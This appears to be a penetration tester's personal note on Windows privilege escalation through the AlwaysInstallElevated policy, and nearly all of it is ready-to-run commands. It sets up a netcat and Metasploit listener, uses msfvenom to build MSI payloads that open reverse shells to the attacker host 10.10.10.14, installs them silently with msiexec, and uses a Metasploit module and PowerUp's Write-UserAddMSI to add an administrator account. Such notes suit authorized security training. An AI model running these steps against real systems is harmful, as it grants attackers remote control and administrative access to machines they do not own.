-- -
[[Dark Arts/Privesc/Windows/Enumeration/AlwaysInstallElevated|Enum]]
### CLI
#### Setup listener
on attack box
```bash
# for regular reverse shell
nc -nvlp 9001

# for meterpreter shell
msfconsole
use multi/handler
set lhost 10.10.10.14
set lport 9001
run
```
#### Generate malware
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.14 lport=9001 -f msi -o setup.msi
msfvenom -p windows/x64/reverse_tcp lhost=10.10.10.14 lport 9001 -f msi -o setup.msi
```
#### Exploit
[[Dark Arts I/File Transfer/Windows|File transfer]] the file over to the target
```powershell
msiexec /quiet /qn /i <path to malicious msi>.msi
msiexec /quiet /qn /i C:\Temp\setup.msi

# check user was added to administrators group
net localgroup administrators
```
#### metasploit
If you have a meterpreter session or a shell via metasploit, you can use this module to do exploit this vector as well.
```bash
# on meterpreter/shell session, background it
bg
background
ctrl+z

# load module
use /exploit/windows/local/always_install_elevated
set session <sess num>
set session 1

# exploit
run
```
### GUI
#### Exploit w/ PowerUp.ps1
You will need to [[Dark Arts I/File Transfer/Windows|file transfer]] it to target.
```powershell
# if you haven't already, load in PowerUp
. .\PowerUp.ps1

# Exploit
# Given output like:
# [*] Checking for AlwaysInstallElevated registry key...
# AbuseeFunction : Write-UserAddMSI

# it's telling you that AlwaysInstallElevated registry key is set to one and that you can abuse it using the PowerUp function Write-UserAddMSI
Write-UserAddMSI

# it will then output an MSI called UserAdd
# with GUI access, double click on it and set a username, password, and group you want to be added to, which generally would be "Administrators".
# check if the new user was successfully added
net localgroup administators

# you should see your new user in the group now
# now log in as that user
```